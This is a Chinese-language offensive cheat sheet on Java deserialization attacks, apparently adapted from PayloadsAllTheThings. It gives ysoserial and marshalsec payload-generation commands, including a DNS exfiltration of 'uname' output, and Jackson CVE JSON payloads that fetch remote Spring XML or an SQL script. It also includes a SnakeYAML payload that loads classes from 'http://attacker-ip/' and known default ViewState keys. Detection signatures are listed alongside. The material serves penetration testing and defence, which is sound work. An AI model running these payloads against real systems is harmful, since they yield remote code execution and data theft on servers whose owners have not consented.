# Java Deserialization - Java反序列化漏洞

[SEARCH_KEYWORDS]
漏洞类型: Deserialization Java 反序列化 RCE Gadget Chain
攻击类型: Remote Code Execution Arbitrary Code Execution
关键词: Java Serialization Serializable ysoserial CommonsCollections Groovy Spring
技术: Gadget Chain POP Chain URLDNS JRMP Jackson SnakeYAML ViewState
工具: ysoserial marshalsec jexboss SerializationDumper
格式: AC ED 00 05 rO0 H4sIAAAAAAAAAJ

[CONTENT]

## Java反序列化概述

Java序列化是将Java对象状态转换为字节流的过程，可存储或传输后重建。当不可信数据传递给反序列化函数时，可能导致任意代码执行。

## 检测特征

| 特征 | 格式 |
|------|------|
| `"AC ED 00 05"` | Hex (序列化魔数) |
| `"rO0"` | Base64 |
| `"H4sIAAAAAAAAAJ"` | gzip(base64) |
| `Content-Type` | `application/x-java-serialized-object` |

## 工具

### ysoserial

```java
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
```

### ysoserial Payload列表

| Payload | 依赖 |
|---------|------|
| CommonsCollections1-7 | commons-collections:3.1 |
| Groovy1 | groovy:2.3.9 |
| Spring1-2 | spring-core, spring-beans |
| Jdk7u21 | 无(仅JDK) |
| URLDNS | 无(DNS检测) |
| ROME | rome:1.0 |
| Hibernate1-2 | Hibernate |
| Myfaces1-2 | Apache MyFaces |

### Burp扩展

- [JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller)
- [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)

### marshalsec

```java
java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
```

## JSON反序列化

### Jackson

检测特征: 错误消息中包含`com.fasterxml.jackson.databind`或`org.codehaus.jackson.map`

**CVE-2017-7525**:

```json
{
  "param": [
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    {
      "transletBytecodes": ["yv66v[JAVA_CLASS_B64_ENCODED]AIAEw=="],
      "transletName": "a.b",
      "outputProperties": {}
    }
  ]
}
```

**CVE-2017-17485**:

```json
{
  "param": [
    "org.springframework.context.support.FileSystemXmlApplicationContext",
    "http://evil/spel.xml"
  ]
}
```

**CVE-2019-12384**:

```json
[
  "ch.qos.logback.core.db.DriverManagerConnectionSource",
  {
    "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"
  }
]
```

## YAML反序列化

### SnakeYAML

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

## ViewState利用

### 编码识别

| 编码 | 开头 |
|------|------|
| base64 | `rO0` |
| base64 + gzip | `H4sIAAA` |

### 存储方式

- **服务端存储**: `value="-XXX:-XXXX"`
- **客户端存储**: `base64 + gzip + Java Object`

### 加密算法

| 算法 | HMAC |
|------|------|
| DES ECB (默认) | HMAC-SHA1 |

### 常见密钥

| 名称 | 值 |
|------|------|
| AES CBC | `NzY1NDMyMTA3NjU0MzIxMA==` |
| DES | `NzY1NDMyMTA=` |
| Blowfish | `NzY1NDMyMTA3NjU0MzIxMA` |

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Deserialization/Java.md